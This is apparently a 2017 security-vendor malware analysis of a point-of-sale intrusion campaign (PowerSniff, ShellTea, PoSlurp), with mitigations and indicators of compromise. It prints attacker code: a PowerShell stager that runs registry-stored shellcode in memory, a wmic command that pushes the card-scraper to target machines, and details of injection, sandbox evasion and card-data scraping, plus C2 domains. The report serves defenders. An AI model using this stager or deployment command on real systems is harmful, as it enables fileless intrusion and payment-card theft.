SHELLTEA + POSLURP MALWARE
 MEMORY-RESIDENT POINT-OF-SALE MALWARE  ATTACKS   INDUSTRY

  ROOT9B
JUNE 2017

TABLE OF CONTENTS

MEMORY-RESIDENT POINT-OF-SALE MALWARE  

 

ATTACK OVERVIEW 

SHELLTEA MEMORY RESIDENT MALWARE (C2) 

  

 

 

 

 

 

 

 

 

 

MALWARE ANALYSIS: PoSLURP MALWARE  

MITIGATION RECOMMENDATIONS 

 

INDICATORS OF COMPROMISE (IOCs) 

TOOLS 

3

4

9

17

22

23

23

2                           

MEMORY-RESIDENT POINT-OF-SALE MALWARE

Retail Point-of-Sale (PoS) systems remain a top target for the financially-motivated hacker. Theft of payment 
card  data  in  large  volume  exists  not  only  as  its  own  segment  within  financial  crime,  but  also  serves  to 
facilitate other even more harmful motives of today’s criminal elements. To the businesses targeted by cyber 
criminals, the negative effects are far reaching with impact on brand reputation, consumer and investor 
confidence, and business growth strategies. With such a lucrative target as payment card data, adversary 
groups continue to adapt Tactics, Techniques, and Procedures (TTPs) in response to defenders’ change in 
security practices. One effective attacker TTP is to use so-called “fileless,” or memory-resident malware, to 
carry out attacks against retailer PoS systems. 

root9B discovered an advanced, targeted PoS intrusion focused on harvesting payment card information 
for exfiltration. The adversary’s campaign has active and operational Command and Control (C2) servers. 
root9B’s analysis determined that the adversary is using advanced memory-resident techniques to maintain 
persistence and avoid detection. The malware likely required a significant amount of time and knowledge to 
create. We typically see techniques at this level by well-resourced, well-funded, motivated adversaries.

This ongoing campaign has targeted numerous organizations and their PoS systems. root9B uncovered the 
TTPs utilized and describes them in a detailed analysis below. At a high-level, the adversary’s methodology 
consists of the following steps:

•  Step  1:  Reconnaissance  and  targeting  of  a  corporate  individual  with  a  spearphishing  email  attack 

employing an ActiveMIME document with an MS Office-enabled macro.

•  Step  2:  Email recipient opens the ActiveMIME document attachment and clicks to enable content, 

executing a PowerShell command initiating a surreptitious shellcode download. 

•  Step 3: A shellcode blob encapsulating a Dynamic Link Library (DLL) malware is dropped in the system 
registry and loaded into memory, conducting basic enumeration and sandbox detection on the target. 
This malware appears to be an updated version of “PowerSniff.”

•  Step 4: The malware continues reconnaissance of the target environment and contacts one of its five 
C2 domains with the results. If the environment meets the conditions the attacker is looking for, the 
attacker sends additional instructions.

•  Step 5: The attackers install a second fileless implant in another registry shellcode blob. This implant, 
which we have named ShellTea, has not been previously observed or reported. We have identified six 
hardcoded C2 domains utilized by this implant.

•  Step 6: The attacker explores the network using compromised privileged credentials and establishes 
persistent  staging  servers  for  deploying  malware  and  collecting  data  from  PoS  endpoints.  Several 
staging servers are utilized by the attackers to spread the workload and provide redundancy to thwart 
defensive measures.

3

•  Step 7: An advanced PoS RAM scraping malware, we have named PoSlurp, is deployed to the PoS 
endpoints. PoSlurp directly injects memory-resident code into a privileged user mode process. This 
capability has not been previously reported. The attacker can specify which PoS processes should be 
monitored for payment card transactions.

root9B has been able to deconstruct the four major components of the adversary’s activities. Provided here 
is a detailed analysis of the initial access method, command-and-control methods, and the new ShellTea 
implant and PoSlurp POS RAM Scraper. 

ATTACK OVERVIEW

INITIAL ACCESS

Initial execution of the attack begins with a customized email to a targeted entity with a malicious macro-
enabled ActiveMime Office document attached. Once the targeted victim opens the attached document and 
clicks to enable macros, the macro quietly launches a PowerShell command that will download another 
PowerShell stage from a staging site (often public paste sites) into memory and execute it. Seen in the 
command line below is the command (iex) to execute the downloaded payload in memory, after determining 
if a 32-bit or 64-bit payload is required ([IntPtr]::size -eq 4). This technique maintains a fileless footprint on 
the target.

 

4                           

POWERSNIFF DROPPER

The previous PowerShell script will in turn load and execute a 32-bit or 64-bit binary shellcode blob in memory. 
The returned shellcode blob includes code to then de-obfuscate and load a DLL into memory. It also includes 
a function hash resolution routine to find API calls it needs that were likely copied from the Carberp source 
code. Carberp was a common piece of malware that served as a full-featured backdoor, often incorporating 
additional payloads with the following features:

•  Steal browser credentials to banking and other websites 

•  Steal credentials from other applications

•  Monitor users’ keystrokes and screens

This malware does not have any of those capabilities, as it only incorporated the function hashing code from 
Carberp. The source code to the Carberp banking trojan was leaked a few years ago and is presumably used 
by several actors now.

Once loaded, the inner DLL includes routines to inject itself into the memory of explorer.exe.

The malicious Office macro and second-stage payload, downloaded and executed in-memory, matches 
previous analysis of "PowerSniff1"  by the following characteristics:

•  Use of WMI in the macro to launch the initial PowerShell command

•  PowerShell command's method of detecting CPU architecture 

(by the size of IntPtr, 8 bytes for 64-bit and 4 bytes for 32-bit) 

•  URL pattern

•  Sandbox detection methods

•  Basic enumeration command strings in memory, like:

 

	

 

	

cmd /C "net.exe view > %s"

cmd	/C	"ipconfig	-all	>	%s"

After being loaded and de-obfuscating itself in memory, the logic of this threat bears a strong resemblance 
to what researchers have called TROJ_RECOLOAD.A , sharing those characteristics as well as the injection 
into explorer.exe. Through preliminary analysis, we believe that TROJ_RECOLOAD.A2 could also be a variant 
of Powersniff. Although, in that analysis, they observed it being launched from an exploit kit.

1https://researchcenter.paloaltonetworks.com/2016/03/powersniff-malware-used-in-macro-based-attacks/
2http://blog.trendmicro.com/trendlabs-security-intelligence/angler-exploit-kit-used-to-find-and-infect-pos-systems/

5

We did detect several differences in the variant we saw. First, the sandbox detection has been overhauled:

Sandbox detection in the new PowerSniff variant

Our sample, despite retaining the sandbox DLL strings in memory, no longer references most of them in code 
as it only looks for two. It maintains the same username checks, and our sample has added instructions for 
detecting sandboxes via several new methods:

•  Computing a checksum of the hard disk volume name and checking against a known checksum.

•  Looking for strings indicative of virtual machines in the system firmware information.

•  Hashing the names of running processes and comparing each against a list of the name hashes of 

known analysis, monitoring, or reverse engineering software. 

6                           

Interestingly, in this function, it appears the malware developers made a mistake. There are only 25 CRC32s 
to check against in the array, but the loop comparing the process name CRC32 to the list of hashes runs 100 
times, reading off the end of the array and into other data. Most likely this is a result of the malware developers 
writing a loop in C/C++ as:

for(int	i	=	0;	i	<	sizeof(hashes);	i++){...hashes[i]...	

instead of:

for(int	i	=	0;	i	<	sizeof(hashes)	/	sizeof(DWORD);	i++){...hashes[i]...

running the loop once for each byte in the hash array instead of once for each hash (each hash takes 4 bytes). 
This mistake likely was not noticed by the developers since this array is not at the end of an allocation, meaning 
no crash occurs.

The adversaries improved and re-implemented these techniques, although they reproduced the same bug, in the 
ShellTea malware explored in-depth below.

In previously reported samples, the malware would download a DLL to disk as .db file and inject the code into 
memory. Our sample included not only the ability to write a DLL to %%userprofile%%\AppData\LocalLow\%u.
db and run it via rundll32, but also to write an executable and run it, or to write a DLL and load it directly into 
the calling process with LoadLibraryW, depending on the instructions provided by the C2 server. This malware 
performs HTTP requests with a user-agent created with the following format string: “Mozilla/4.0 (compatible; 
MSIE 8.0; Windows NT %u.%u%s)”

Additionally, we observed functionality, if instructed by the server, to write a DLL and add it to the "HKLM\
System\CurrentControlSet\Control\Session Manager\AppCertDlls" registry key. This is an unusual persistence 
method that can also be used as an AppLocker bypass. Each DLL in AppCertDlls will be loaded by the OS into a 
process whenever a new process is created.

7

Memory strings from the new PowerSniff variant

Another difference in this variant, is that the strings checked to avoid targeting hospitals and schools have 
now been removed. This implies the actors behind this intrusion are either: 1.) willing to target healthcare and 
educational institutions; or 2.) confident their targeted delivery mechanisms make these checks unnecessary.

We also observed new C2 servers (see the IOCs section for details.)

The PowerSniff sample we analyzed, also inserted the string koollondon/ into the URL path used to contact its 
C2 servers. Koollondon (http://koolLondon.com/) is a radio station in London, England.

After the initial PowerSniff intrusion, we observed the threat actors deploy ShellTea, a newly identified piece of 
memory-resident malware for persistent access, and PoSlurp, a newly identified PoS malware.

8                           

SHELLTEA MEMORY RESIDENT MALWARE (C2)

Immediately following execution of PowerSniff (and a reboot), we discovered a set of suspicious registry values 
being launched in a registry key under HKCU\Software, one of which is reproduced below. This registry value 
held a PowerShell command that was loaded and invoked in memory by a separate PowerShell launcher. We 
have reproduced the registry command below, sanitized and formatted slightly for clarity. It acts as a stager to 
load and execute a shellcode-style implant into memory. It does so by first loading up a binary registry value 
under the same key with Get-ItemProperty into variable $s.

$s=(Get-ItemProperty	-Path	HKCU:Software\Random_Generated_RegistryName	
–Name	Random_KeyName).Random_KeyName_;	
$l=$s.Length;

Next  it  uses  Add-Type  to  enable  the  PowerShell  script  to  directly  call  the  Win32  functions  VirtualAlloc, 
CreateThread, and WaitForSingleObject:

$c="[DllImport(`"user32.dll`")]`npublic	static	extern	Int32	
IsChild(Int32	a,Int32	b);`n[DllImport(`"kernel32.dll`")]`npublic	
static	extern	Int32	
GetCurrentProcessId();`n[DllImport(`"kernel32.dll`")]`npublic	static	
extern	IntPtr	CreateThread(IntPtr	a,uint	b,IntPtr	c,IntPtr	d,uint	
e,IntPtr	f);`n[DllImport(`"kernel32.dll`")]`npublic	static	extern	
UInt32	WaitForSingleObject(IntPtr	a,	UInt32
	b);`n[DllImport(`"kernel32.dll`")]`npublic	static	extern	IntPtr	
VirtualAlloc(IntPtr	a,uint	b,uint	c,uint	d);";
$a=Add-Type	-memberDefinition	$c	-Name	'Win32'	-namespace	
Win32Functions	-passthru;

Internally,  Add-Type  dynamically  creates  a  .cs  file  (C#  source  code)  in  the  user’s  temp  directory  including 
the declarations from the PowerShell string, runs csc.exe to compile that file into a DLL, loads the DLL from 
the temporary directory, then deletes the intermediate files.  This automatically created DLL is built from the 
source code in the $c variable. It simply serves as a thin wrapper to allow PowerShell, which can normally only 
directly call .NET class and object methods, to call the three given Win32 functions. It has no additional logic 
in it specific to this malware and is not used again after the script calls those three functions. We mention it 
since the dynamic creation and loading of DLLs from temporary directories is detectable with appropriate 
monitoring software.

After enabling access to these functions by loading the new type, the script calls VirtualAlloc to allocate a 
section of memory that is readable, writable, and executable. It then copies the contents of the binary registry 
value into the new section of memory, creates a thread to start executing the loaded implant in memory, and 
finally waits up to 5 seconds for the thread to complete.

9

$b=$a::VirtualAlloc(0,$l,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($s,0,$b,$l);
$b=$a::CreateThread(0,0,$b,0,0,0);
$b=$a::WaitForSingleObject($b,5000))

The binary, which is never saved to a file, is the body of the memory-resident implant. It is composed of 64-
bit code and data. At the start are two instructions to call 1024 bytes into the shellcode blob, followed by 
configuration data. The shellcode then calculates its own address by reading it off the stack after it had been 
saved by the call instruction. This is a trick common to 32-bit shellcode and seems to show the author was more 
familiar with writing 32-bit shellcode. This trick is not necessary in 64-bit as 64-bit shellcode can directly read 
its own address or calculate an offset of it.

The start of the ShellTea shellcode

After obtaining its own address in memory, the shellcode processes a series of relocations. It calculates the 
difference between its current location in memory and its original base address (0x690000 in our sample). 
It then updates each of the relocations in memory, just like a normal executable loader. This process also 
performs some de-obfuscations on the binary. After this point, we can dump memory and begin to disassemble 
the code.

The loader progresses to use a custom function resolver with a simple string hash algorithm that handles 
loading the required DLLs and resolving their imported functions. However, the binary has very few imported 
functions. Throughout the code, nearly every API call dynamically resolves a function, again re-using this custom 
resolver and a 4-byte hash. We believe this is a previously unknown API hashing algorithm, as it did not match 

10                           

other public API hashing algorithms3 or others we have encountered. We did not find any other public use of 
some of the constants used in this hashing algorithm, such as 0x463283F5. The API hashing algorithm makes 
use of a standard linear congruential random number generator (multiplier 0x19660, increment 0x3C6EF35F.)

ShellTea API hashing algorithm

We created a custom script to automatically map each of those function hashes to the corresponding API 
function before continuing analysis. First, we exported the disassembly of the entire implant and grepped for 
the function hash constants, saving those in one file. Second, we embedded the shellcode and function hashes 
into a small C++ resolver program. This program called the hash-resolution function on each of the hashes, 
then used the Debug Help API to find out the names of the API functions that had been resolved. This same 
method can enable malware reverse engineers to resolve all hashed functions in a sample without stepping 
through each resolution in the original malware (which is a time-consuming and manual process) or recreating 
the function hashing algorithm. A link to this Function Hash Resolution tool can be found in the Tools section.

3https://github.com/mandiant/Reversing/blob/master/shellcode_hashes/make_sc_hash_db.py

11

Function hashing analysis harness

Third, we pasted the output of the resolver program into a small IDA Python script (in Tools) to apply all the 
function resolutions to the analysis of the binary.

IDA script to apply function resolutions

12                           

The binary then adds a custom vectored exception handler to catch any crashes from within its own code and 
to continue execution safely if possible. 

The sample decrypts its own callback domains from its configuration block, which is also in the binary with the 
rest of the code. In our case, we list the six domains observed in the IOC section.

The implant also attempts to read and decrypt C2 information from a different registry key, if present, in addition 
to the built-in domains. The registry key is derived with CRC32 from various system-specific data sources. It 
then connects over port 443 using a custom binary protocol. It queries proxy configuration from the registry 
(HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings) and can communicate through proxies 
via the CONNECT method as well. The implant’s protocol uses the XTEA encryption algorithm in CBC mode.

The  implant  developers  have  a  distinct  preference  for  using  low-level  native  API  functions,  presumably  to 
avoid detection by standard analysis and HIPS tools. They also make extensive use of CRC32 by calling the 
undocumented RtlComputeCrc32 function. This function is uncommon, but was used most prominently by the 
ZeroAccess rootkit4 and the Andromeda malware5, although neither in the same manner as is found in 
our sample. 

For example, the implant applies CRC32 to the computer and username and XORs with the SID subauthority 
values  taken  directly  from  the  SID  structure  to  assemble  a  mutex  name.  It  uniquely  identifies  an  implant 
and prevents duplicate infection against the same host under the same user account. This is likely done to 
differentiate hosts for tasking. 

Excerpt from ShellTea’s mutex name derivation

4http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/zeroaccess_indepth.pdf
5https://blog.avast.com/andromeda-under-the-microscope

13

The  implant  injects  its  code  into  explorer.exe.  First,  it  finds  the  process  ID.  Second,  it  uses  the  low-level 
RtlAdjustPrivilege call with the ID of the SE_DEBUG access right to enable the right to inject into nearly any 
process. Third, it opens the process, allocates memory in the process, copies its code into the allocated space, 
and uses the low level RtlCreateUserThread API to create a thread in the target process that will start executing 
its code. It then completes the process injection. It can find explorer by finding the process ID owning the shell's 
desktop window by comparing process names or by using GetShellWindow. This is a function to return a handle 
to the Windows desktop which would be owned by explorer.exe.

In addition to the API obfuscation, the implant uses extensive string obfuscation. It creates most strings on the 
stack directly before use, character by character, by adding and subtracting various values from a fixed start 
byte. Fortunately, a good decompiler will see through these. Below is a before-and-after comparison of the code 
that creates the format string used for the implant’s mutex:

ShellTea mutex format string

14                           

The implant is built in a modular manner and implements several capabilities. The command dispatcher is 
shown below:

ShellTea command dispatcher

It has built-in routines to:

•  Drop an executable in a temporary directory, run it, and queue it for deletion at next reboot. It does 
so by using the Windows MoveFileEx API with the MOVEFILE_DELAY_UNTIL_REBOOT flag. Internally, 
this  API  writes  to  the  PendingFileRenameOperations  value  of  the  registry  key  HKLM\SYSTEM\
CurrentControlSet\Control\Session Manager.

•  Drop a DLL in a temporary directory and to load it, queuing it for deletion at next reboot via the 

same mechanism.

•  Load an extension DLL directly into memory. It includes a separate routine that will finish mapping the 

DLL into memory and link up its imports without touching disk. 

•  Run an operator-provided PowerShell command and receive results back. 

•  Run raw shellcode directly in memory.

•  Install persistence by writing to the current user’s Run key in the registry.

15

The  implant  implements  sandbox  and  analysis  detection  with  numerous  techniques  reminiscent  of  the 
analyzed PowerSniff variant. It has improvements in algorithms used, number of analysis processes detected, 
and employs the just-in-time API function hash resolution:

•  Querying the SystemFirmwareTableInformation from the system and looking for common hypervisors.

•  Obtaining the name of the system volume, hashing it, and comparing to a known hypervisor hash. In 

this case, in contrast with our PowerSniff variant, ShellTea uses SHA1 as a hashing algorithm.

•  Enumerating  processes  with  a  low-level  API  (querying  SystemProcessInformation),  computing  a 
CRC32  checksum  of  the  upper-cased  version  of  process  names  and  comparing  against  a  table  of 
known monitoring or analysis processes. This includes the default process names of Process Monitor, 
Wireshark, and IDA. Again, this uses a new checksum algorithm.

ShellTea’s process name CRC32 comparison

16                           

Once again, as in the PowerSniff variant, it appears the malware developers made the same mistake. There 
are now 27 CRC32s to check against in the array, but the loop comparing the process name CRC32 to the list 
of hashes runs 108 times. It reads off the end of the array and into other data. This is most likely because the 
malware developers wrote a loop that runs once for each byte in the checksum array instead of once for each 
checksum (each checksum takes 4 bytes.)

When the malware exits, it cleans itself up from memory using a clever technique. The exit function replaces 
its own return address with the address of RtlExitUserThread, then sets up the arguments for the VirtualFree 
function to free its own code and jumps directly to VirtualFree. This function deallocates all the binary’s memory. 
Then, when the Windows API function returns, rather than returning to the implant code (which no longer exists 
in memory), it returns directly to the RtlExitUserThread function. This kills the thread and cleans up nearly all 
traces of the malware from the injected process.

At this point, the adversaries have a foothold which they can use to explore the network environment further. 
root9B observed the use of  common lateral movement techniques, such as dumping passwords, password 
hashes, and Kerberos tickets with tools like mimikatz or similar. We also observed the adversaries stealing 
tokens, then using those credentials or creating forged Kerberos tickets (“Golden Tickets”) to maneuver laterally 
and  gain  access  to  network  servers  on  the  PoS  network  which  would  become  the  staging  points  for  the 
remainder of the attack.

After obtaining the appropriate access to a server, they use that server to conduct basic network discovery to 
locate PoS endpoints and create target lists stored in flat text files. Then they have been observed to launch 
shell commands, including wmic.exe, to push the PoS software, which we dubbed PoSlurp, to the PoS machines 
to launch it. Upon successful collection and exfil of payment card data using PoSlurp, the adversaries then 
clean-up after themselves to eliminate on-disk artifacts.

POSLURP MALWARE

PoSlurp is a highly-obfuscated malicious RAM scraper that gets remotely deployed to PoS systems and can be 
launched via local or remote commands. 

The file can be launched in any number of ways, but root9B observed it with both local and remote execution 
with command-line arguments matching the following pattern: 

Local Execution:

[PoSlurp_filename].exe	TARGET1.EXE#TARGET2.exe*1234*winlogon.exe

Remote Execution: 

This command uses the file targets.txt as target list to direct the execution of PoSlurp to specific PoS 
end-points.

17

wmic		/node:"@targets.txt"	process	call	create	"cmd	/c	[PoSlurp_filename].exe	
TARGET1.EXE#TARGET2.exe*1234*winlogon.exe"

The target executable names in the arguments refer to specific processes relating to PoS payment/routing 
software. The number in the middle is how  many minutes (1234) to run the RAM scraper, while the last filename 
in the command line (winlogon.exe) refers to the process to inject the inner PoSlurp malware into. As far as we 
can tell, PoSlurp should be able to inject itself into any user mode process. 

PoSlurp has an extensive amount of obfuscation to make analysis difficult, such as the use of opaque predicates 
(functions with no return opcode just a jump or alternative instruction) and multiple steps to load its main code. 
That said, we did not see sandbox and analysis detection in this sample. PoSlurp uses a three-step approach 
to load:

Step 1: The outer layer or Step 1 of the PoSlurp malware, like the ShellTea backdoor, used a custom function 
resolver with a simple string hash algorithm that handles loading the required DLLs and resolving the imported 
functions. This function hashing algorithm, however, was unique and not the same as the ShellTea sample.

PoSlurp API hashing

18                           

PoSlurp’s Step 1 first calculates one constant by resolving the address of RtlWriteMemoryStream via function 
hash 0x22F3608C, then reads the second byte of that function, which is always 1, to calculate its second 
function hash. Since its introduction into Windows, RtlWriteMemoryStream has remained unimplemented as a 
function. It simply returns an error code. This means that the bytes of this function have not changed and can 
be treated as constants. The novel technique of using this code as a constant ensures that the malware will 
function reliably, yet fools some automated analysis tools that are not aware of the binary structure of all the 
external modules.

Step 1 then uses the newly calculated hash, 0x1BC4C4FC, to resolve the low-level ZwAllocateVirtualMemory 
function which it calls to allocate executable and writable memory to extract its second step to. After decoding 
and copying the payload to the newly obtained memory, it starts executing the second step code. In our case, 
the second step was 6610 bytes long. 

Step 2 This code has its own resolution-by-hash function, a copy of the Carberp function hashing algorithm. 
Like PowerSniff, PoSlurp only incorporated the function hashing code from Carberp. One of the first functions 
to be resolved uses hash 0x594AA9E4, the function hash of ZwAllocateVirtualMemory in that algorithm. The 
Carberp-based Step 2 simply loads and links yet another embedded obfuscated binary as a third step, using 
low-level  library  loading  and  function  resolution  functions  like  LdrLoadDll  and  LdrGetProcedureAddress  to 
resolve the third step’s imported functions.

Step 3 is an inner DLL that uses minimal obfuscation tricks and contains most of the business logic. Step 3 is 
not completely unobfuscated, as it does use string obfuscation reminiscent of the ShellTea memory-resident 
backdoor by assembling strings on the stack one character at a time. It parses the command line of the calling 
process, extracting out process names to inject into and monitor. It finds those processes using the standard 
high-level CreateToolhelp32Snapshot and associated API calls, comparing executable names from the data 
returned.

The inner DLL uses similar process injection code to ShellTea as well. First, it finds the process ID. Second, it 
uses the low-level RtlAdjustPrivilege call with the ID of the SE_DEBUG access right to enable the right to inject 
into nearly any process. Third, it opens the process, allocates memory in the process, copies its code into the 
allocated space, and uses the low level RtlCreateUserThread API to create a thread in the target process that 
will start executing its code. This completes the process injection. After that point, the original process exits.

After being injected into the target process, PoSlurp re-links itself, deletes any old output file if present, 
and launches its RAM scraping functionality. Every 5 seconds until timeout, each data section of the target 
processes’ memory is identified and scanned for strings indicative of payment card data which are then 
encrypted and saved.

19

PoSlurp memory scraping outer loop

When scanning memory, it efficiently identifies memory sections of interest with VirtualQueryEx, then reads 
them into newly allocated sections of memory of the same size in its own process to search through 
their contents.

PoSlurp code to search for data memory segments

20                           

Payment card data is detected by a series of simple tests which look for properly formatted data, such as 
strings of digits followed by an equals sign, with both ASCII and wide-char strings. When payment card data is 
detected, the malware first calculates a hash of the string and checks against a running list of output hashes to 
ensure it does not output duplicate data, then writes its output to a hidden file in the %TMP% directory. It stores 
hashes for the last 10,000 strings it has output to use in its duplicate check.

Assuming this is a new piece of payment card data and not a duplicate of one already detected, the data is 
encrypted with  a simple  XOR-based stream cipher using  a randomly-selected 4-byte key. This  algorithm  is 
based on a standard linear congruential random number generator with multiplier 0x19660D, but with a different 
increment value (- 0x49F91E6B) than the most common (0x3C6EF35F, which is also used in the PowerSniff and 
ShellTea malware.)

PoSlurp encryption algorithm

Each chunk of the output file starts with a 5-byte header containing the length of the chunk in the first byte 
followed by the 4-byte key and the encrypted data. Based on this static analysis, we created a decryption 
script for the data files shown below.
#!/usr/bin/ruby
#	Run	like	this	in	a	console:	ruby	decrypt.rb	<	encrypted_data
inp	=	STDIN
l	=	inp.read(1)
until	l.nil?
				len	=	l.unpack('C')[0]
				key	=	inp.read(4).unpack('V')[0]
				crypted	=	inp.read(len).unpack('C*')
				plain	=	crypted.map	do	|c|
								p	=	(c	^	key)	&	0xFF
								key	=	((0x19660D	*	key)	&	0xFFFFFFFF)	-	0x49F91E6B
        p
    end
				puts	plain.pack('C*').inspect
				l	=	inp.read(1)
end

This script may aid future incident responders or law enforcement to identify what data has been stolen.

21

MITIGATION RECOMMENDATIONS

•  Apply macro restrictions in your environment to prevent users from inadvertently running malicious 
Office macros to help address this common initial access vector. For details, see: https://blogs.technet.
microsoft.com/mmpc/2016/03/22/new-feature-in-office-2016-can-block-macros-and-help-prevent-
infection/.

•  Limit  the  exposure  of  privileged  administrator  credentials  by  following  best  practices  such  as  the 
PAW model, audit your credential risks, and require multifactor authentication for privileged users. For 
details,  see:  https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/
privileged-access-workstations.

•  Implement application whitelisting on PoS systems utilizing Microsoft’s built-in AppLocker or one of 
many commercial solutions. Much like the previous mitigation recommendation, PoS systems should 
be highly standardized and have no software running or installed that isn’t part of required functionality. 
Audit application execution in a development environment to build an effective yet minimal whitelist. 

•  Develop  and  maintain  a  robust  security  monitoring  program  or  contract  an  experienced  security 
company. Tune your environment to collect relevant network and endpoint-based artifacts that allow 
you to detect adversary actions. Focus your analysis on critical network segments and employ active 
defense methodologies (HUNT) to proactively identify persistent threats.

•  Create a whitelist or greylist of domains and IP addresses that your organization is allowed to reach 

via the network. 

•  Implement  effective  network  segmentation  controls.  Prohibiting  communication  between  distinct 
segments such as PoS and Store networks, except for required ports and protocols, and using different 
credentials  in  each  network  will  greatly  delay  if  not  eliminate  the  attacker’s  ability  to  traverse  the 
networks. Communication between systems in these critical networks should be far more predictable 
than  the  corporate  network,  enabling  a  security  monitoring  program  to  more  easily  identify 
abnormal activity. 

22                           

INDICATORS OF COMPROMISE (IOCS)
POWERSNIFF C2 DOMAINS

vseflijkoindex.net

vortexclothings.biz

unkerdubsonics.org

popskentown.com

SHELLTEA C2 DOMAINS

neofilgestunin.org

verfgainling.net

straubeoldscles.org

olohvikoend.org

menoograskilllev.net

asojinoviesder.org

TOOLS

Function  Hash  Resolution  Tool,  IDA  Script,  and  Process  Name  CRC32  Code:  https://gist.github.com/
root9b/24b9b25f3b0b06a6939881e68d0bd2d0

23

WWW.ROOT9B.COM

